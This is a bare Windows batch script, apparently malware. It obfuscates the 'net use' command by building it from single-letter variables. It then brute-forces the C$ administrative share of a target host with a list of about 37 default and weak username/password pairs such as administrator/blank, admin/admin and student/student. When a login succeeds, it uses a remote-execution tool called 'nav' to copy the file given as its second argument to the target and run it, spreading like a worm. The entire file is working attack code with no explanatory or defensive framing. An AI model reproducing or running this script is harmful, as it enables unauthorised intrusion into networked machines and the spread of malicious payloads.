@echo off
set F=u
set Z=s
set B=n
set L=e
set U=t
set G=e
%B%%L%%U% %F%%Z%%G% \\%1\c$ "xxyyzz" /user:administrator
if not errorlevel 1 goto ccccccccc29
%B%%L%%U% %F%%Z%%G% \\%1\c$ "abc" /user:admin
if not errorlevel 1 goto ccccccccc30
%B%%L%%U% %F%%Z%%G% \\%1\c$ "student" /user:student
if not errorlevel 1 goto ccccccccc31
%B%%L%%U% %F%%Z%%G% \\%1\c$ "teacher" /user:teacher
if not errorlevel 1 goto ccccccccc32
%B%%L%%U% %F%%Z%%G% \\%1\c$ "" /user:user
if not errorlevel 1 goto ccccccccc33
%B%%L%%U% %F%%Z%%G% \\%1\c$ "user" /user:user
if not errorlevel 1 goto ccccccccc34
%B%%L%%U% %F%%Z%%G% \\%1\c$ "test" /user:test
if not errorlevel 1 goto ccccccccc4
%B%%L%%U% %F%%Z%%G% \\%1\c$ "test123" /user:administrator
if not errorlevel 1 goto ccccccccc5
%B%%L%%U% %F%%Z%%G% \\%1\c$ "1" /user:administrator
if not errorlevel 1 goto ccccccccc26
%B%%L%%U% %F%%Z%%G% \\%1\c$ "123" /user:administrator
if not errorlevel 1 goto ccccccccc27
%B%%L%%U% %F%%Z%%G% \\%1\c$ "12345" /user:admin
if not errorlevel 1 goto ccccccccc28
%B%%L%%U% %F%%Z%%G% \\%1\c$ "temp" /user:administrator
if not errorlevel 1 goto ccccccccc6
%B%%L%%U% %F%%Z%%G% \\%1\c$ "" /user:administrator
if not errorlevel 1 goto ccccccccc1
%B%%L%%U% %F%%Z%%G% \\%1\c$ "" /user:administrator
if not errorlevel 1 goto ccccccccc35
%B%%L%%U% %F%%Z%%G% \\%1\c$ "Administrator" /user:administrator
if not errorlevel 1 goto ccccccccc2
%B%%L%%U% %F%%Z%%G% \\%1\c$ "Administrator" /user:administrator
if not errorlevel 1 goto ccccccccc37
%B%%L%%U% %F%%Z%%G% \\%1\c$ "test" /user:administrator
if not errorlevel 1 goto ccccccccc3
%B%%L%%U% %F%%Z%%G% \\%1\c$ "admin" /user:administrator
if not errorlevel 1 goto ccccccccc10
%B%%L%%U% %F%%Z%%G% \\%1\c$ "temp123" /user:administrator
if not errorlevel 1 goto ccccccccc7
%B%%L%%U% %F%%Z%%G% \\%1\c$ "pass" /user:administrator
if not errorlevel 1 goto ccccccccc8
%B%%L%%U% %F%%Z%%G% \\%1\c$ "password" /user:administrator
if not errorlevel 1 goto ccccccccc9
%B%%L%%U% %F%%Z%%G% \\%1\c$ "root" /user:root
if not errorlevel 1 goto ccccccccc11
%B%%L%%U% %F%%Z%%G% \\%1\c$ "changeme" /user:administrator
if not errorlevel 1 goto ccccccccc12
%B%%L%%U% %F%%Z%%G% \\%1\c$ "admin" /user:admin
if not errorlevel 1 goto ccccccccc13
%B%%L%%U% %F%%Z%%G% \\%1\c$ "123456" /user:administrator
if not errorlevel 1 goto ccccccccc14
%B%%L%%U% %F%%Z%%G% \\%1\c$ "654321" /user:administrator
if not errorlevel 1 goto ccccccccc15
%B%%L%%U% %F%%Z%%G% \\%1\c$ "abc123" /user:administrator
if not errorlevel 1 goto ccccccccc16
%B%%L%%U% %F%%Z%%G% \\%1\c$ "12345" /user:administrator
if not errorlevel 1 goto ccccccccc36
%B%%L%%U% %F%%Z%%G% \\%1\c$ "red123" /user:administrator
if not errorlevel 1 goto ccccccccc17
%B%%L%%U% %F%%Z%%G% \\%1\c$ "admin123" /user:administrator
if not errorlevel 1 goto ccccccccc18
%B%%L%%U% %F%%Z%%G% \\%1\c$ "qwerty" /user:administrator
if not errorlevel 1 goto ccccccccc19
%B%%L%%U% %F%%Z%%G% \\%1\c$ "asdf" /user:administrator
if not errorlevel 1 goto ccccccccc20
%B%%L%%U% %F%%Z%%G% \\%1\c$ "password123" /user:administrator
if not errorlevel 1 goto ccccccccc21
%B%%L%%U% %F%%Z%%G% \\%1\c$ "secret" /user:administrator
if not errorlevel 1 goto ccccccccc22
%B%%L%%U% %F%%Z%%G% \\%1\c$ "qwertyuiop" /user:administrator
if not errorlevel 1 goto ccccccccc23
%B%%L%%U% %F%%Z%%G% \\%1\c$ "12345" /user:administrator
if not errorlevel 1 goto ccccccccc24
%B%%L%%U% %F%%Z%%G% \\%1\c$ "54321" /user:administrator
if not errorlevel 1 goto ccccccccc25
goto cccccccccend
:ccccccccc1
nav \\%1 -u administrator -p "" -d attrib.exe -r %2
nav \\%1 -u administrator -p "" -f -c -d %2 -o
nav \\%1 -u administrator -p "" -d %2 -o
goto cccccccccend
:ccccccccc10
nav \\%1 -u administrator -p "admin" -d attrib.exe -r %2
nav \\%1 -u administrator -p "admin" -f -c -d %2 -o
nav \\%1 -u administrator -p "admin" -d %2 -o
goto cccccccccend
:ccccccccc2
nav \\%1 -u administrator -p "administrator" -d attrib.exe -r %2
nav \\%1 -u administrator -p "administrator" -f -c -d %2 -o
nav \\%1 -u administrator -p "administrator" -d %2 -o
goto cccccccccend
:ccccccccc37
nav \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
nav \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
nav \\%1 -u administrator -p "Administrator" -d %2 -o
goto cccccccccend
:ccccccccc11
nav \\%1 -u root -p "root" -d attrib.exe -r %2
nav \\%1 -u root -p "root" -f -c -d %2 -o
nav \\%1 -u root -p "root" -d %2 -o
goto cccccccccend
:ccccccccc13
nav \\%1 -u admin -p "admin" -d attrib.exe -r %2
nav \\%1 -u admin -p "admin" -f -c -d %2 -o
nav \\%1 -u admin -p "admin" -d %2 -o
goto cccccccccend
:ccccccccc3
nav \\%1 -u administrator -p "test" -d attrib.exe -r %2
nav \\%1 -u administrator -p "test" -f -c -d %2 -o
nav \\%1 -u administrator -p "test" -d %2 -o
goto cccccccccend
:ccccccccc4
nav \\%1 -u test -p "test" -d attrib.exe -r %2
nav \\%1 -u test -p "test" -f -c -d %2 -o
nav \\%1 -u test -p "test" -d %2 -o
goto cccccccccend
:ccccccccc5
nav \\%1 -u administrator -p "test123" -d attrib.exe -r %2
nav \\%1 -u administrator -p "test123" -f -c -d %2 -o
nav \\%1 -u administrator -p "test123" -d %2 -o
goto cccccccccend
:ccccccccc6
nav \\%1 -u administrator -p "temp" -d attrib.exe -r %2
nav \\%1 -u administrator -p "temp" -f -c -d %2 -o
nav \\%1 -u administrator -p "temp" -d %2 -o
goto cccccccccend
:ccccccccc7
nav \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
nav \\%1 -u administrator -p "temp123" -f -c -d %2 -o
nav \\%1 -u administrator -p "temp123" -d %2 -o
goto cccccccccend
:ccccccccc8
nav \\%1 -u administrator -p "pass" -d attrib.exe -r %2
nav \\%1 -u administrator -p "pass" -f -c -d %2 -o
nav \\%1 -u administrator -p "pass" -d %2 -o
goto cccccccccend
:ccccccccc9
nav \\%1 -u administrator -p "password" -d attrib.exe -r %2
nav \\%1 -u administrator -p "password" -f -c -d %2 -o
nav \\%1 -u administrator -p "password" -d %2 -o
goto cccccccccend
:ccccccccc12
nav \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
nav \\%1 -u administrator -p "changeme" -f -c -d %2 -o
nav \\%1 -u administrator -p "changeme" -d %2 -o
goto cccccccccend
:ccccccccc14
nav \\%1 -u administrator -p "123456" -d attrib.exe -r %2
nav \\%1 -u administrator -p "123456" -f -c -d %2 -o
nav \\%1 -u administrator -p "123456" -d %2 -o
goto cccccccccend
:ccccccccc15
nav \\%1 -u administrator -p "654321" -d attrib.exe -r %2
nav \\%1 -u administrator -p "654321" -f -c -d %2 -o
nav \\%1 -u administrator -p "654321" -d %2 -o
goto cccccccccend
:ccccccccc16
nav \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
nav \\%1 -u administrator -p "abc123" -f -c -d %2 -o
nav \\%1 -u administrator -p "abc123" -d %2 -o
goto cccccccccend
:ccccccccc17
nav \\%1 -u administrator -p "red123" -d attrib.exe -r %2
nav \\%1 -u administrator -p "red123" -f -c -d %2 -o
nav \\%1 -u administrator -p "red123" -d %2 -o
goto cccccccccend
:ccccccccc18
nav \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
nav \\%1 -u administrator -p "admin123" -f -c -d %2 -o
nav \\%1 -u administrator -p "admin123" -d %2 -o
goto cccccccccend
:ccccccccc19
nav \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
nav \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
nav \\%1 -u administrator -p "qwerty" -d %2 -o
goto cccccccccend
:ccccccccc20
nav \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
nav \\%1 -u administrator -p "asdf" -f -c -d %2 -o
nav \\%1 -u administrator -p "asdf" -d %2 -o
goto cccccccccend
:ccccccccc21
nav \\%1 -u administrator -p "password123" -d attrib.exe -r %2
nav \\%1 -u administrator -p "password123" -f -c -d %2 -o
nav \\%1 -u administrator -p "password123" -d %2 -o
goto cccccccccend
:ccccccccc22
nav \\%1 -u administrator -p "secret" -d attrib.exe -r %2
nav \\%1 -u administrator -p "secret" -f -c -d %2 -o
nav \\%1 -u administrator -p "secret" -d %2 -o
goto cccccccccend
:ccccccccc23
nav \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
nav \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
nav \\%1 -u administrator -p "qwertyuiop" -d %2 -o
goto cccccccccend
:ccccccccc24
nav \\%1 -u administrator -p "12345" -d attrib.exe -r %2
nav \\%1 -u administrator -p "12345" -f -c -d %2 -o
nav \\%1 -u administrator -p "12345" -d %2 -o
goto cccccccccend
:ccccccccc25
nav \\%1 -u administrator -p "54321" -d attrib.exe -r %2
nav \\%1 -u administrator -p "54321" -f -c -d %2 -o
nav \\%1 -u administrator -p "54321" -d %2 -o
goto cccccccccend
:ccccccccc26
nav \\%1 -u administrator -p "1" -d attrib.exe -r %2
nav \\%1 -u administrator -p "1" -f -c -d %2 -o
nav \\%1 -u administrator -p "1" -d %2 -o
goto cccccccccend
:ccccccccc27
nav \\%1 -u administrator -p "123" -d attrib.exe -r %2
nav \\%1 -u administrator -p "123" -f -c -d %2 -o
nav \\%1 -u administrator -p "123" -d %2 -o
goto cccccccccend
:ccccccccc28
nav \\%1 -u admin -p "12345" -d attrib.exe -r %2
nav \\%1 -u admin -p "12345" -f -c -d %2 -o
nav \\%1 -u admin -p "12345" -d %2 -o
goto cccccccccend
:ccccccccc29
nav \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
nav \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
nav \\%1 -u administrator -p "xxyyzz" -d %2 -o
goto cccccccccend
:ccccccccc30
nav \\%1 -u admin -p "abc" -d attrib.exe -r %2
nav \\%1 -u admin -p "abc" -f -c -d %2 -o
nav \\%1 -u admin -p "abc" -d %2 -o
goto cccccccccend
:ccccccccc31
nav \\%1 -u student -p "student" -d attrib.exe -r %2
nav \\%1 -u student -p "student" -f -c -d %2 -o
nav \\%1 -u student -p "student" -d %2 -o
goto cccccccccend
:ccccccccc32
nav \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
nav \\%1 -u teacher -p "teacher" -f -c -d %2 -o
nav \\%1 -u teacher -p "teacher" -d %2 -o
goto cccccccccend
:ccccccccc33
nav \\%1 -u user -p "" -d attrib.exe -r %2
nav \\%1 -u user -p "" -f -c -d %2 -o
nav \\%1 -u user -p "" -d %2 -o
goto cccccccccend
:ccccccccc34
nav \\%1 -u user -p "user" -d attrib.exe -r %2
nav \\%1 -u user -p "user" -f -c -d %2 -o
nav \\%1 -u user -p "user" -d %2 -o
goto cccccccccend
:ccccccccc35
nav \\%1 -u administrator -p "" -d attrib.exe -r %2
nav \\%1 -u administrator -p "" -f -c -d %2 -o
nav \\%1 -u administrator -p "" -d %2 -o
goto cccccccccend
:ccccccccc36
nav \\%1 -u administrator -p "12345" -d attrib.exe -r %2
nav \\%1 -u administrator -p "12345" -f -c -d %2 -o
nav \\%1 -u administrator -p "12345" -d %2 -o
goto cccccccccend
:cccccccccend
